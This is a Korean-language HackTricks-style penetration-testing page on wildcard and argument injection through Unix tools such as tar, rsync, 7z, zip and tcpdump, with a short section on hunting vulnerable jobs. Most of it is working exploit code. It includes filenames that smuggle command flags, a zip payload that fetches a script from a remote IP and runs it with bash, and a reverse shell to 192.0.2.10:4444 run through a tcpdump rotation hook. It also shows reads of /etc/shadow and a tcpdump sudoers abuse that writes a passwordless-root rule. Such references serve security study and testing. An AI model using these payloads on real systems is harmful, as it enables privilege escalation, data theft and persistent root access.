# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection**는 권한이 있는 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z`, … 같은 Unix binary를 따옴표로 감싸지 않은 wildcard `*`와 함께 실행할 때 발생한다.
> shell은 binary를 실행하기 **전에** wildcard를 확장하므로, working directory에 파일을 만들 수 있는 공격자는 `-`로 시작하는 filename을 만들어 이를 **data 대신 options로 해석**되게 할 수 있고, 사실상 arbitrary flags나 심지어 commands까지 밀어넣을 수 있다.
> 이 페이지는 2023-2025의 가장 유용한 primitive, 최신 research, 그리고 modern detections를 모은다.

## chown / chmod

`--reference` flag를 악용하면 **arbitrary file의 owner/group 또는 permission bits를 복사**할 수 있다:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root가 나중에 다음과 같은 것을 실행할 때:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file`가 주입되어, 일치하는 *모든* 파일이 `/root/secret``file`의 소유권/권한을 상속하게 된다.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
자세한 내용은 classic DefenseCode paper도 참고하라.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 기능을 악용해 임의 명령을 실행하라:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
예를 들어 root가 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 root로 실행됩니다.

### bsdtar / macOS 14+

최근 macOS에서 기본 `tar`( `libarchive` 기반)는 `--checkpoint`를 구현하지 않지만, 외부 압축 프로그램을 지정할 수 있는 **--use-compress-program** 플래그를 사용하면 여전히 code-execution을 달성할 수 있습니다.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
권한이 있는 스크립트가 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작된다.

---

## rsync

`rsync`는 `-e` 또는 `--rsync-path`로 시작하는 명령줄 플래그를 통해 원격 shell 또는 원격 binary를 덮어쓸 수 있게 해준다:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

권한이 있는 스크립트가 와일드카드 앞에 `--`를 붙여서(옵션 파싱을 막기 위해) *방어적으로* 처리하더라도, 7-Zip 형식은 파일명 앞에 `@`를 붙여 **file list files**를 지원한다. 여기에 symlink를 결합하면 *임의의 파일을 exfiltrate*할 수 있다:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
만약 root가 다음과 같은 것을 실행하면:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip은 `root.txt`(→ `/etc/shadow`)를 file list로 읽으려 시도하다가 중단되며, **내용을 stderr로 출력**합니다.

이는 `-- *`에서도 그대로 통하는데, 7-Zip CLI가 positional input으로 일반 filename과 `@listfiles`를 모두 명시적으로 허용하기 때문에 `@root.txt` 같은 리터럴 filename도 여전히 특수하게 처리되기 때문입니다.

---

## zip

application이 user-controlled filenames를 `zip`에 넘길 때(와일드카드를 통해서든 `--` 없이 이름을 열거하든) 매우 실용적인 primitive 두 가지가 존재합니다.

- RCE via test hook: `-T`는 “test archive”를 활성화하고, `-TT <cmd>`는 tester를 임의의 program으로 바꿉니다(long form: `--unzip-command <cmd>`). `-`로 시작하는 filenames를 주입할 수 있다면, short-options parsing이 동작하도록 flags를 서로 다른 filename들에 나눠서 넣으세요:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- 단일 파일명처럼 `'-T -TT <cmd>'`를 시도하지 마세요 — short options는 문자 단위로 파싱되므로 실패합니다. 표시된 것처럼 separate tokens를 사용하세요.
- 앱이 파일명에서 슬래시를 제거한다면, bare host/IP(`/index.html` default path)에서 fetch하고 `-O`로 로컬에 저장한 뒤 execute하세요.
- 토큰이 어떻게 소비되는지 이해하려면 `-sc`(processed argv 표시) 또는 `-h2`(더 많은 help)로 parsing을 debug할 수 있습니다.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 웹 계층이 `zip`의 stdout/stderr를 그대로 echo하면(허술한 wrapper에서 흔함), `--help` 같은 주입된 flags나 잘못된 options로 인한 실패가 HTTP response에 드러나 command-line injection을 확인하고 payload 조정을 돕는다.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

다음 commands는 최근 CTF와 실제 환경에서 악용되었다. payload는 항상 나중에 wildcard로 처리될 writable directory 안에 *filename*으로 생성된다:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

이러한 primitives는 *tar/rsync/zip* classics보다 덜 흔하지만, hunting할 때 확인할 가치가 있다.

---

## Hunting vulnerable wrappers and jobs

최근 case studies는 wildcard/argv injection이 더 이상 **cron + tar** 문제만이 아님을 보여준다. 같은 bug class가 계속 다음에서 나타난다:

- attacker-controlled upload directories에서 "download everything as zip/tar"하는 web features
- attacker-controlled filename/filter fields를 가진 **tcpdump** wrapper를 노출하는 vendor/appliance debug shells
- writable directories에서 `tar`, `rsync`, `7z`, `zip`, `chown`, `chmod`를 호출하는 backup 또는 rotation jobs

유용한 triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *`는 많은 GNU tools에서는 좋은 fix이지만, `7z`/`7za`에서는 **아님**. `@listfiles`가 별도로 parsed 되기 때문.
- `zip`에서는 user-controlled filenames를 직접 enumerate하는 wrappers를 찾아라; short-option splitting(`-T` + `-TT <cmd>`)은 shell glob이 없어도 여전히 동작한다.
- `tcpdump`에서는 **output file names**, **rotation settings**, 또는 **capture-file replay** arguments를 제어할 수 있게 해주는 wrappers에 특히 주의하라.

---

## tcpdump rotation hooks (-G/-W/-z): wrappers에서 argv injection을 통한 RCE

restricted shell이나 vendor wrapper가 strict quoting/validation 없이 user-controlled fields(예: "file name" parameter)를 이어 붙여 `tcpdump` command line을 만들면, extra `tcpdump` flags를 smuggle할 수 있다. `-G`(time-based rotation), `-W`(limit number of files), `-z <cmd>`(post-rotate command) 조합은 tcpdump를 실행하는 user로 arbitrary command execution을 가능하게 한다(아플라이언스에서는 종종 root).

Preconditions:

- `tcpdump`에 전달되는 `argv`를 influence할 수 있어야 한다(예: `/debug/tcpdump --filter=... --file-name=<HERE>` 같은 wrapper를 통해).
- wrapper가 file name field에서 spaces 또는 `-`-prefixed tokens를 sanitize하지 않는다.

Classic PoC (writable path에서 reverse shell script를 실행):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1`은 첫 번째 일치하는 packet 이후 즉시 rotate를 강제한다.
- `-z <cmd>`는 rotation마다 post-rotate command를 한 번 실행한다. 많은 빌드는 `<cmd> <savefile>`을 실행한다. `<cmd>`가 script/interpreter이면, argument handling이 payload와 일치하는지 확인하라.

No-removable-media variants:

- 파일을 write할 수 있는 다른 primitive가 있다면(예: output redirection을 허용하는 별도 command wrapper), script를 알려진 path에 넣고 `-z /bin/sh /path/script.sh` 또는 platform semantics에 따라 `-z /path/script.sh`를 트리거하라.
- 일부 vendor wrapper는 attacker-controllable locations로 rotate한다. rotated path를 influence할 수 있다면(symlink/directory traversal), external media 없이도 완전히 control하는 content를 실행하도록 `-z`를 유도할 수 있다.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

매우 흔한 sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob와 permissive patterns는 첫 번째 `-w` 인자만 제한합니다. `tcpdump`는 여러 개의 `-w` 옵션을 허용하며, 마지막 것이 적용됩니다.
- 이 규칙은 다른 옵션을 고정하지 않아서 `-Z`, `-r`, `-V` 등도 허용됩니다.

Primitives
- 두 번째 `-w`로 destination path를 override 합니다(첫 번째는 sudoers만 만족):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 첫 번째 `-w` 안에서 path traversal로 제한된 tree를 탈출:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root`로 출력 소유권을 강제하기(root 소유 파일을 어디든 생성):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r`를 통해 조작한 PCAP를 재생해서 임의 콘텐츠를 write할 수 있음(예: sudoers 줄을 drop):

<details>
<summary>정확한 ASCII payload를 포함하는 PCAP를 만들고 root로 write하기</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>`로 임의 파일 읽기/secret leak 가능(저장 파일 목록을 해석함). 오류 진단이 종종 줄을 그대로 출력해서 내용을 leak함:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
